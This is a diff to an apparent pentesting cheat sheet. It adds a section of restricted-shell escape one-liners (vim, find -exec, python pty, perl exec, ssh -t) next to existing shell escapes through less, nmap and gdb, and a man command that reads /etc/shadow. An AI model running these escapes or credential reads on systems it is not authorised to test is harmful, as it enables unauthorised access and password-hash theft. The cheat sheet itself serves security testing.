@@ -16,7 +16,7 @@
 ```bash
 less (!sh)
 more (!sh)
-VIM/VIM (:!sh)
+Vi/Vim (:!sh)
 nmap (--interactive + !sh)
 ftp (!sh)
 gdb (!sh)
@@ -32,3 +32,29 @@ man -P "cat /etc/shadow" man
 ```
 ##### Docker
 [dockerevil](https://github.com/pyperanger/dockerevil)
+
+### Restricted Shells
+##### Escape with Vi/Vim
+```bash
+Vi/Vim (:!sh)
+```
+##### Escape with Find
+```bash
+find /home/<Username> -name <Exisiting Filename> -exec /bin/sh \;
+# If file exists, it executes the command.
+```
+##### Escape with Python
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+##### Escape with Perl
+```bash
+perl -e 'exec "/bin/sh";'
+```
+##### Escape with SSH
+```bash
+ssh <Restricted Username>@<Target> -t "/bin/sh"
+```
+
+# References
+[Escape Restricted Shell](https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22)
